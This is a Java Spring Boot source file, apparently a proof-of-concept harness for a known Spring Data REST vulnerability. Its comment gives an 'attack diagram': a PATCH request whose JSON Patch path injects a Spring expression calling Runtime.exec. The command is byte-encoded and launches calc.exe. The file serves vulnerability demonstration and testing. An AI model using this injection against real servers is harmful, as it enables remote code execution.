package org.fornever.cve;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class CVEApplication {

	public static void main(String[] args) {

		SpringApplication.run(CVEApplication.class, args);

		/** create test instance
		 
			POST /entityPersons/ HTTP/1.1
			Host: localhost:8080
			Content-Type: application/json
			Cache-Control: no-cache
			
			{
				"firstName":"f2"
			}
			
		 */
		
		/** attack diagram

			PATCH /entityPersons/1 HTTP/1.1
			Host: localhost:8080
			Content-Type: application/json-patch+json
			Cache-Control: no-cache
			
			[
				{
					"op":"test", 
					"path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[] {67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 115, 121, 115, 116, 101, 109, 51, 50, 92, 99, 97, 108, 99, 46, 101, 120, 101} ))", 
					"value":""	
				}
			]
			
		 */
	}

}
